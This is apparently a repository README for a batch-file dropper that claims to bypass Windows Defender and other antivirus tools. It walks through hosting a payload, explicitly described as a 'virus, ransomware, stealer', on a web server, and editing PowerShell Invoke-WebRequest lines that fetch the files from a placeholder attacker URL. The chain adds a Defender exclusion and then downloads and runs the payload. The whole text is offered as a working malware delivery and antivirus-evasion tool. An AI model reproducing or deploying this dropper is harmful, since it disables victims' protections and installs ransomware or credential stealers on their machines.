# Antivirus Bypass
Fully undetectable bypass for Windows Defender and every other antivirus (FUD at the moment). Works by downloading a bat file that adds an exclusion for exe files, and then downloads your file and runs it.

# Setup
If you already have a webserver, skip to step 2.  
  
1, To start setting up the bypass, you will need a webserver, you can create one by heading over to https://replit.com and creating an HTML, CSS & JS repl, after that, you will need to run the repl. It should then open up a website preview and give you the webserver URL above it.  
  
2, Upload the file you wish to execute (virus, ransomware, stealer, etc) to the webserver and rename the file to installer.exe.  
  
3, Edit line 31 in the installer.bat file:  
```bat
Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe"
```
Change https://YOURSITE.COM/installer.exe to your webserver URL. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.exe  
  
4, Upload the installer.bat to your webserver.
5, Edit line 4 in the main.bat file:
```bat
Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat"
```
Replace https://YOURSITE.COM/installer.bat with your webserver URL and the path to the installer.bat file. If you use replit, it should look like this: https://replname.wnetmc.repl.co/installer.bat  
  
6, Done. The file you would use to bypass windows defender would be main.bat. You can convert it to an executable but this will raise the number of detections. If this helped you, make sure to star this repository (;
